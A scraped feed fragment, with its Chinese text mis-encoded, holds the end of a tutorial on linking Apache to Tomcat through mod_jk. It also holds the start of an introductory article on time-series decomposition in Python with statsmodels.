<pre><code class="hljs language-bash" lang="bash">LoadModule jk_module modules/mod_jk.so
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>ç„¶åå¯ç”¨æ¨¡å—ï¼š</p>
<pre><code class="hljs">sudo a2enmod jk
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-5">7. é…ç½® workersï¼ˆå‘Šè¯‰ Apache æ€ä¹ˆè¿ Tomcatï¼‰</h3>
<p>åˆ›å»ºæ–‡ä»¶Â <code>/etc/apache2/workers.properties</code>ï¼Œå†…å®¹ç±»ä¼¼ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">worker.list</span>=worker1
<span class="hljs-attr">worker.worker1.type</span>=ajp13
<span class="hljs-attr">worker.worker1.host</span>=localhost
<span class="hljs-attr">worker.worker1.port</span>=<span class="hljs-number">8009</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>å†åˆ›å»ºä¸€ä¸ªé…ç½®æ–‡ä»¶Â <code>/etc/apache2/jk.conf</code>ï¼ˆæˆ–åŠ åˆ° apache2.conf é‡Œï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">JkWorkersFile /etc/apache2/workers.properties
JkMount /* worker1
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-6">8. é‡å¯ Apache å’Œ Tomcat</h3>
<pre><code class="hljs">sudo systemctl restart apache2
sudo systemctl restart tomcat9
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-7">9. æµ‹è¯•</h3>
<p>æ”¾ä¸ª JSP é¡µé¢åˆ° Tomcat çš„ webapps ç›®å½•ä¸‹ï¼Œæ¯”å¦‚Â <code>test.jsp</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">&lt;%= <span class="hljs-keyword">new</span> java.<span class="hljs-property">util</span>.<span class="hljs-title class_">Date</span>() %&gt;
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>ç„¶åé€šè¿‡ Apache è®¿é—®ï¼š<code>http://ä½ çš„æœåŠ¡å™¨/test.jsp</code>ï¼Œå¦‚æœèƒ½æ˜¾ç¤ºæ—¶é—´ï¼Œè¯´æ˜æˆåŠŸäº†ã€‚</p>
<p>â€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ•°æ®åˆ†æå¸ˆçš„â€œæ°´æ™¶çƒâ€ï¼šæ—¶é—´åºåˆ—åˆ†æ]]></title>    <link>https://juejin.cn/post/7588680081326293034</link>    <guid>https://juejin.cn/post/7588680081326293034</guid>    <pubDate>2025-12-28T09:30:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588680081326293034" data-draft-id="7588152122187530294" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ•°æ®åˆ†æå¸ˆçš„â€œæ°´æ™¶çƒâ€ï¼šæ—¶é—´åºåˆ—åˆ†æ"/> <meta itemprop="keywords" content="Python,æ•°æ®åˆ†æ,æ•°æ®æŒ–æ˜"/> <meta itemprop="datePublished" content="2025-12-28T09:30:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="databook"/> <meta itemprop="url" content="https://juejin.cn/user/3526889035006702"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ•°æ®åˆ†æå¸ˆçš„â€œæ°´æ™¶çƒâ€ï¼šæ—¶é—´åºåˆ—åˆ†æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3526889035006702/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    databook
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T09:30:08.000Z" title="Sun Dec 28 2025 09:30:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¾ˆå¤šåˆšå…¥è¡Œçš„å°ä¼™ä¼´é—®æˆ‘ï¼šâ€œ<em>æˆ‘æƒ³é¢„æµ‹ä¸‹ä¸ªæœˆå…¬å¸çš„é”€å”®é¢ï¼Œæˆ–è€…é¢„æµ‹ä¸€ä¸‹æ˜å¤©çš„è‚¡ä»·ï¼Œè¯¥å­¦ä»€ä¹ˆï¼Ÿ</em>â€</p>
<p>æˆ‘çš„å›ç­”é€šå¸¸åªæœ‰å…­ä¸ªå­—ï¼š<strong>æ—¶é—´åºåˆ—åˆ†æ</strong>ã€‚</p>
<p>å¦‚æœåœ¨æ•°æ®åˆ†æçš„ä¸–ç•Œé‡Œæœ‰ä¸€ç§é­”æ³•èƒ½è®©ä½ â€œé¢„çŸ¥æœªæ¥â€ï¼Œé‚£ä¸€å®šå°±æ˜¯å®ƒã€‚</p>
<h2 data-id="heading-0">1. ä»€ä¹ˆæ˜¯æ—¶é—´åºåˆ—ï¼Ÿ</h2>
<p>åˆ«è¢«åè¯å“åˆ°äº†ã€‚ç®€å•æ¥è¯´ï¼Œ<strong>æ—¶é—´åºåˆ—ï¼ˆTime Seriesï¼‰å°±æ˜¯æŒ‰æ—¶é—´é¡ºåºæ’åˆ—çš„ä¸€ç»„æ•°æ®</strong>ã€‚</p>
<p>æ¯”å¦‚ï¼š</p>
<ul>
<li>ä½ æ‰‹æœºé‡Œæ¯å¤©çš„æ­¥æ•°è®°å½•ï¼›</li>
<li>æŸåªè‚¡ç¥¨æ¯å¤©çš„æ”¶ç›˜ä»·ï¼›</li>
<li>æˆ–è€…æ˜¯ä½ å®¶æ¥¼ä¸‹ä¾¿åˆ©åº—æ¯ä¸ªæœˆçš„è¥ä¸šé¢ã€‚</li>
</ul>
<p>è¿™äº›æ•°æ®éƒ½æœ‰ä¸€ä¸ªå…±åŒç‚¹ï¼š<strong>æœ‰ä¸€ä¸ªæ—¶é—´è½´ï¼Œä¸”æ•°æ®éšç€æ—¶é—´å˜åŒ–ã€‚</strong></p>
<p>æˆ‘ä»¬åš<strong>æ—¶é—´åºåˆ—åˆ†æ</strong>çš„<strong>æ ¸å¿ƒç›®çš„</strong>ï¼Œå°±æ˜¯è¦ä»è¿‡å»çš„**â€œå†å²æ•°æ®â€<strong>ä¸­æ‰¾å‡ºè§„å¾‹ï¼Œç„¶åæŠŠè¿™ä¸ªè§„å¾‹å»¶é•¿åˆ°</strong>â€œæœªæ¥â€<strong>ï¼Œè¿™å°±æ˜¯</strong>é¢„æµ‹**ã€‚</p>
<h2 data-id="heading-1">2. åƒå‰¥æ´‹è‘±ä¸€æ ·æ‹†è§£æ•°æ®ï¼šæ—¶é—´åºåˆ—çš„å››å¤§æˆåˆ†</h2>
<p>åˆå­¦è€…æœ€å®¹æ˜“çŠ¯çš„é”™è¯¯æ˜¯ç›´æ¥æŠŠæ•°æ®ä¸¢è¿›æ¨¡å‹é‡Œè·‘ã€‚</p>
<p>ä½œä¸ºä¸€åè€æ‰‹ï¼Œæˆ‘è¦å‘Šè¯‰ä½ ï¼š<strong>çœ‹åˆ°æ•°æ®ï¼Œå…ˆæ‹†è§£ã€‚</strong></p>
<p>é€šå¸¸ï¼Œä»»ä½•ä¸€ä¸ªéšæ—¶é—´å˜åŒ–çš„æ•°æ®ï¼ˆæ¯”å¦‚ä¸€å®¶å¥¶èŒ¶åº—çš„æ—¥é”€é‡ï¼‰ï¼Œéƒ½å¯ä»¥è¢«æ‹†åˆ†ä¸º<strong>å››ä¸ªéƒ¨åˆ†</strong>ã€‚</p>
<h3 data-id="heading-2">2.1. é•¿æœŸè¶‹åŠ¿--â€œå¤§åŠ¿æ‰€è¶‹â€</h3>
<p>è¿™æ˜¯æ•°æ®åœ¨é•¿æ—¶é—´å†…çš„ä¸»è¦è¿åŠ¨æ–¹å‘ã€‚</p>
<ul>
<li><strong>ä¾‹å­</strong>ï¼šè¿™å®¶å¥¶èŒ¶åº—å¼€äº†ä¸‰å¹´ï¼Œéšç€å“ç‰ŒçŸ¥ååº¦æå‡ï¼Œæ•´ä½“é”€é‡æ¯å¹´éƒ½åœ¨æ¶¨ã€‚è¿™å°±æ˜¯<strong>è¶‹åŠ¿</strong>ã€‚</li>
<li><strong>åœ°ä½</strong>ï¼šå®ƒæ˜¯æ€»å˜åŠ¨çš„è€å¤§ï¼Œå†³å®šäº†é•¿æœŸçš„æ–¹å‘ã€‚</li>
</ul>
<h3 data-id="heading-3">2.2. å­£èŠ‚å˜åŠ¨--â€œæ˜¥å¤ç§‹å†¬çš„è½®å›â€</h3>
<p>æ•°æ®å—å­£èŠ‚ã€èŠ‚å‡æ—¥ç­‰å›ºå®šå‘¨æœŸå½±å“è€Œå‡ºç°çš„æ³¢åŠ¨ã€‚</p>
<ul>
<li><strong>ä¾‹å­</strong>ï¼šå¤å¤©å¤©æ°”çƒ­ï¼Œå†°é¥®å–å¾—ç–¯å¿«ï¼›å†¬å¤©å†·ï¼Œé”€é‡è‡ªç„¶ä¸‹æ»‘ï¼›æ¯åˆ°å‘¨æœ«é”€é‡å°±æ¯”å‘¨ä¸€é«˜ã€‚è¿™ç§éšç€æ—¶é—´å›ºå®šé‡å¤çš„æ³¢åŠ¨ï¼Œå°±æ˜¯<strong>å­£èŠ‚æ€§</strong>ã€‚</li>
<li><strong>åœ°ä½</strong>ï¼šå®ƒæ˜¯æ€»å˜åŠ¨çš„è€äºŒï¼Œéå¸¸è§„å¾‹ï¼Œé¢„æµ‹èµ·æ¥æœ€å‡†ã€‚</li>
</ul>
<h3 data-id="heading-4">2.3. å¾ªç¯å˜åŠ¨--â€œéš¾ä»¥æ‰æ‘¸çš„å‘¨æœŸâ€</h3>
<p>è¿™æ˜¯ä¸€äº›å‘¨æœŸè¾ƒé•¿ã€ä¸å›ºå®šçš„æ³¢åŠ¨ï¼Œé€šå¸¸å’Œå®è§‚ç»æµæœ‰å…³ã€‚</p>
<ul>
<li><strong>ä¾‹å­</strong>ï¼šç”±äºç»æµå±æœºï¼Œå¤§å®¶é’±åŒ…ç´§äº†ï¼Œå¥¶èŒ¶å–å¾—å°‘äº†ã€‚ç­‰ç»æµå¤è‹ï¼Œåˆå–å¤šäº†ã€‚</li>
<li><strong>æ³¨æ„</strong>ï¼šè¿™éƒ¨åˆ†åŸå› å¤æ‚ï¼Œå‘¨æœŸä¸å›ºå®šï¼Œæˆ‘ä»¬åœ¨åŸºç¡€é¢„æµ‹ä¸­é€šå¸¸<strong>ä¸åšé‡ç‚¹è€ƒè™‘</strong>ã€‚</li>
</ul>
<h3 data-id="heading-5">2.4. ä¸è§„åˆ™å˜åŠ¨--â€œè€å¤©çˆ·çš„å¿ƒæƒ…â€</h3>
<p>è¿™æ˜¯éšæœºçš„ã€ä¸å¯æ§çš„æ³¢åŠ¨ã€‚</p>
<ul>
<li><strong>ä¾‹å­</strong>ï¼šæŸå¤©çªç„¶ä¸‹æš´é›¨ï¼Œæ²¡äººå‡ºé—¨ï¼Œé”€é‡æš´è·Œï¼›æˆ–è€…æŸå¤©ç½‘çº¢æ¥æ‰“å¡ï¼Œé”€é‡æš´æ¶¨ã€‚</li>
<li><strong>æ³¨æ„</strong>ï¼šè¿™æ˜¯â€œå™ªéŸ³â€ï¼Œåœ¨é¢„æµ‹ä¸­æˆ‘ä»¬å¾ˆéš¾æ•æ‰å®ƒï¼Œé€šå¸¸å‡è®¾å®ƒä¸º0æˆ–å¿½ç•¥ã€‚</li>
</ul>
<blockquote>
<p><strong>ï¼ˆé‡ç‚¹ï¼‰ï¼š</strong><br/>
åœ¨å®é™…çš„æ—¶é—´åºåˆ—é¢„æµ‹ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦æŠ“ <strong>â€œé•¿æœŸè¶‹åŠ¿â€ å’Œ â€œå­£èŠ‚å˜åŠ¨â€</strong>ã€‚</p>
<p>æŠ“ä½äº†è¿™ä¸¤æ¡å¤§é±¼ï¼Œé¢„æµ‹çš„å‡†ç¡®åº¦é€šå¸¸èƒ½è¾¾åˆ°80%ä»¥ä¸Šã€‚</p>
<p>è‡³äºå¾ªç¯å˜åŠ¨å’Œä¸è§„åˆ™å˜åŠ¨ï¼Œå› ä¸ºå æ¯”å°ä¸”å¤ªå¤æ‚ï¼Œæˆ‘ä»¬å¾€å¾€é€‰æ‹©æˆ˜ç•¥æ€§å¿½ç•¥ã€‚</p>
</blockquote>
<h2 data-id="heading-6">3. æ‰‹æŠŠæ‰‹æ•™ä½ ï¼šç”¨Pythonæ‹†è§£æ—¶é—´åºåˆ—</h2>
<p>å…‰è¯´ä¸ç»ƒå‡æŠŠå¼ã€‚ä¸‹é¢æˆ‘ä»¬ç”¨<code>Python</code>ä»£ç æ¨¡æ‹Ÿä¸€ç»„å¥¶èŒ¶åº—çš„é”€å”®æ•°æ®ï¼Œå¹¶æ¼”ç¤ºå¦‚ä½•æŠŠè¿™å››ä¸ªæˆåˆ†â€œæ‹†â€å‡ºæ¥ã€‚</p>
<p>é¦–å…ˆï¼Œæ„é€ â€œè™šå‡â€çš„å¥¶èŒ¶åº—æ•°æ®ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># === ç¬¬ä¸€æ­¥ï¼šæ„é€ æ•°æ® ===</span>
<span class="hljs-comment"># å‡è®¾æˆ‘ä»¬æœ‰è¿‡å»3å¹´ï¼ˆ36ä¸ªæœˆï¼‰çš„æœˆåº¦é”€å”®æ•°æ®</span>
dates = pd.date_range(start=<span class="hljs-string">'2021-01-01'</span>, periods=<span class="hljs-number">36</span>, freq=<span class="hljs-string">'ME'</span>)

<span class="hljs-comment"># 1. åˆ¶é€ ã€é•¿æœŸè¶‹åŠ¿ã€‘ï¼šæ¯ä¸ªæœˆé”€é‡åŸºç¡€å¢åŠ  10 æ¯</span>
trend = np.linspace(<span class="hljs-number">100</span>, <span class="hljs-number">460</span>, <span class="hljs-number">36</span>)

<span class="hljs-comment"># 2. åˆ¶é€ ã€å­£èŠ‚å˜åŠ¨ã€‘ï¼šæ¨¡æ‹Ÿæ¯å¹´å¤å¤©é«˜ã€å†¬å¤©ä½ (ç”¨æ­£å¼¦æ³¢æ¨¡æ‹Ÿ)</span>
<span class="hljs-comment"># è¿™é‡Œçš„é€»è¾‘æ˜¯åˆ¶é€ ä¸€ä¸ªå‘¨æœŸæ€§çš„æ³¢æµª</span>
seasonality = <span class="hljs-number">50</span> * np.sin(np.linspace(<span class="hljs-number">0</span>, <span class="hljs-number">3</span> * <span class="hljs-number">2</span> * np.pi, <span class="hljs-number">36</span>))

<span class="hljs-comment"># 3. åˆ¶é€ ã€ä¸è§„åˆ™å˜åŠ¨/å™ªéŸ³ã€‘ï¼šéšæœºæ³¢åŠ¨</span>
noise = np.random.normal(<span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">36</span>)

<span class="hljs-comment"># 4. åˆæˆæ€»é”€é‡</span>
total_sales = trend + seasonality + noise

<span class="hljs-comment"># åˆ›å»º DataFrame</span>
df = pd.DataFrame({<span class="hljs-string">'Date'</span>: dates, <span class="hljs-string">'Sales'</span>: total_sales})
df.set_index(<span class="hljs-string">'Date'</span>, inplace=<span class="hljs-literal">True</span>)
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f2d39a71777e48d5b1d6870e5ec5b8df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767519008&amp;x-signature=0Up1CFtrG2BldYY9pTVRIf3J8aA%3D" alt="" loading="lazy"/></p>
<p>ç„¶åï¼Œä½¿ç”¨ <code>statsmodels</code> åº“è¿›è¡Œåˆ†è§£ï¼Œå®ƒèƒ½å¸®æˆ‘ä»¬ä¸€é”®æ‹†è§£æ•°æ®ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> statsmodels.tsa.seasonal <span class="hljs-keyword">import</span> seasonal_decompose

<span class="hljs-comment"># === ç¬¬äºŒæ­¥ï¼šæ•°æ®åˆ†è§£ ===</span>
<span class="hljs-comment"># model='additive' è¡¨ç¤ºåŠ æ³•æ¨¡å‹ï¼ˆé”€é‡ = è¶‹åŠ¿ + å­£èŠ‚ + å™ªéŸ³ï¼‰</span>
<span class="hljs-comment"># å¦‚æœæ³¢åŠ¨å¹…åº¦éšç€è¶‹åŠ¿å˜å¤§è€Œå˜å¤§ï¼Œé€šå¸¸ç”¨ä¹˜æ³•æ¨¡å‹ (multiplicative)</span>
decomposition = seasonal_decompose(df[<span class="hljs-string">'Sales'</span>], model=<span class="hljs-string">'additive'</span>)

<span class="hljs-comment"># === ç¬¬ä¸‰æ­¥ï¼šç»˜å›¾å±•ç¤º ===</span>
fig = decomposition.plot()
fig.set_size_inches(<span class="hljs-number">12</span>, <span class="hljs-number">10</span>) <span class="hljs-comment"># è®¾ç½®ç”»å¸ƒå¤§å°</span>
plt.show()
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0962196639c04f0dbc6f2cd3e9f14dbb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767519008&amp;x-signature=9ks1nQe8cXYAYPvmXLnAxHY8%2F78%3D" alt="" loading="lazy"/></p>
<p>ä»ä¸Šé¢å››ä¸ªå­å›¾å¯ä»¥çœ‹å‡ºï¼š</p>
<ol>
<li><strong>Observed (åŸå§‹æ•°æ®)</strong>ï¼šä½ çœ‹åˆ°çš„çœŸå®é”€é‡æ›²çº¿ï¼Œä¸Šè¹¿ä¸‹è·³ã€‚</li>
<li><strong>Trend (è¶‹åŠ¿)</strong>ï¼šä¸€æ¡ç¨³æ­¥å‘ä¸Šçš„ç›´çº¿ã€‚è¿™å‘Šè¯‰è€æ¿ï¼š<em>æ”¾å¿ƒï¼Œè™½ç„¶æ¯ä¸ªæœˆæœ‰æ³¢åŠ¨ï¼Œä½†å’±ä»¬åº—æ•´ä½“æ˜¯è¶Šåšè¶Šå¥½çš„ï¼</em></li>
<li><strong>Seasonal (å­£èŠ‚æ€§)</strong>ï¼šéå¸¸æœ‰è§„å¾‹çš„æ³¢æµªçº¿ã€‚è¿™å‘Šè¯‰åº—é•¿ï¼š<em>æ¯å¹´6-8æœˆè¦å¤šå¤‡è´§ï¼Œ12-1æœˆå¯ä»¥å®‰æ’å‘˜å·¥è½®ä¼‘ã€‚</em></li>
<li><strong>Resid (æ®‹å·®/ä¸è§„åˆ™é¡¹)</strong>ï¼šå›´ç»•0ä¸Šä¸‹è·³åŠ¨çš„æ‚ä¹±ç‚¹ã€‚è¿™æ˜¯æˆ‘ä»¬æ— æ³•é¢„æµ‹çš„éšæœºäº‹ä»¶ã€‚</li>
</ol>
<h2 data-id="heading-7">4. åˆ†æå¸ˆçš„å†…åŠŸï¼šä¸ä»…ä»…æ˜¯ä»£ç </h2>
<p>å­¦ä¼šäº†ä¸Šé¢çš„ä»£ç ï¼Œä½ å·²ç»å…¥é—¨äº†ã€‚ä½†ä½œä¸ºè¿‡æ¥äººï¼Œæˆ‘æƒ³å‘Šè¯‰ä½ ï¼Œå·¥å…·å’Œç®—æ³•è™½ç„¶å±‚å‡ºä¸ç©·ï¼Œä½†<strong>åˆ†ææ€è·¯</strong>æ‰æ˜¯ä¸‡å˜ä¸ç¦»å…¶å®—çš„ã€‚</p>
<p>é¦–å…ˆï¼Œå…³æ³¨<strong>æ•°æ®çš„å¹³ç¨³æ€§</strong>ï¼Œè¿™æ˜¯æ—¶é—´åºåˆ—åˆ†æçš„é—¨æ§›ã€‚</p>
<p>ç®€å•è¯´ï¼Œå¤§éƒ¨åˆ†å¤æ‚çš„ç»Ÿè®¡æ¨¡å‹ï¼ˆå¦‚ARIMAï¼‰éƒ½å‡è®¾æ•°æ®çš„æ€§è´¨ï¼ˆå‡å€¼ã€æ–¹å·®ï¼‰ä¸éšæ—¶é—´å˜åŒ–ã€‚</p>
